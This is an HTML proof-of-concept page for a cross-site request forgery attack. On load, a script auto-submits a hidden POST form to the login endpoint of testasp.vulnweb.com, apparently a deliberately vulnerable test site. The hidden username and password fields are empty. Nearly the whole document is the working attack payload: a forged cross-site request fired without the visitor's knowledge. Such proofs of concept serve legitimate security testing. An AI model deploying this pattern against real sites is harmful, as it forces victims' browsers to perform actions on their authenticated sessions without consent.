
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This form will automatically submit when the page loads:</p>
    <form id="csrf-form" action="http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml" method="post">
        <input type="hidden" name="tfUName" value="">
        <input type="hidden" name="tfUPass" value="">

    </form>
    <script>
        // Auto-submit the form when the page loads
        window.onload = function() {
            document.getElementById("csrf-form").submit();
        }
    </script>
</body>
</html>
